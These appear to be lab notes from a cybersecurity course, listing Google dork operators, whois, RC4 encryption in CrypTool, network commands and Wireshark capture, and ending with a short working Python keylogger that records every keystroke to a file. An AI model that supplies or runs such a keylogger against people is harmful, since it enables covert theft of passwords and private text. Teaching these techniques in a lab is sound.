**Practical 1: Google & Whois Reconnaissance**


Google Dorking: Use the following operators individually or in combination to gather information:


site: - Restrict search to a specific site (e.g., site:example.com)

intitle: - Search for pages with a specific word in the title (e.g., intitle:login)

inurl: - Search for pages with a specific word in the URL (e.g., inurl:admin)

filetype: - Restrict search to specific file types (e.g., filetype:pdf)

intext: - Search for pages containing specific text (e.g., intext:password)

cache: - View cached version of a page (e.g., cache:example.com)

related: - Find similar sites (e.g., related:example.com)

info: - Get information about a site (e.g., info:example.com)

define: - Get definitions (e.g., define:phishing)

allintitle: - All specified words in title (e.g., allintitle:login page)

allinurl: - All specified words in URL (e.g., allinurl:admin panel)

allintext: - All specified words in text (e.g., allintext:secure login)

OR or | - Either search term (e.g., password OR passphrase)

AND - Both search terms (e.g., login AND password - often implied)

- - Exclude a term (e.g., login -example.com)

() - Group terms (e.g., site:example.com (login OR register))

* - Wildcard (e.g., "best * in London")

"search term" - Exact phrase (e.g., "change password")

Whois Lookup: Use whois [domain] to retrieve domain registration information (e.g., whois example.com).




**Practical 2: RC4 Encryption/Decryption (CrypTool)**


Open CrypTool.

Create a new file (File -> New).

Enter text.

Encrypt: Encryption/Decryption -> Symmetric(Modern) -> RC4 -> Encrypt.

View encrypted data.

Decrypt: Decrypt button.




**Practical 3: Basic Network Commands**


tracert [target] (e.g., tracert google.com)
Syntax: Tracert [-d] [-h MaxHops] [-w TimeOut] [-4] [-6] target [/?]

ping [target] (e.g., ping google.com)
Syntax: Ping [-t] [-a] [-n count] [-l size] [-f] [-i TTL] [-v TOS] [-r count] [-s count] [-w timeout] [-R] [ S srcaddr] [-p] [-4] [-6] target [/?]

ipconfig (Windows) or ifconfig (Linux)

netstat
Syntax: netstat [-a] [-b] [-e] [-f] [-n] [-o] [-p protocol] [-r] [-s] [-t] [-x] [-y] [time_interval] [/?]

arp
Syntax: arp [-a [InetAddr] [-N IfaceAddr]] [-g [InetAddr] [-N IfaceAddr]] [d InetAddr [IfaceAddr]] [-s InetAddr EtherAddr [IfaceAddr]]




**Practical 5: Network Traffic Capture with Wireshark**

Install Wireshark.

Select the network interface to capture traffic.

Start capture.

Analyze captured packets.

Use filters (e.g., http, tcp.port == 80) to refine the capture.




**Practical 7: Keylogger with Python**

from pynput import keyboard

log_file = "keystrokes.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
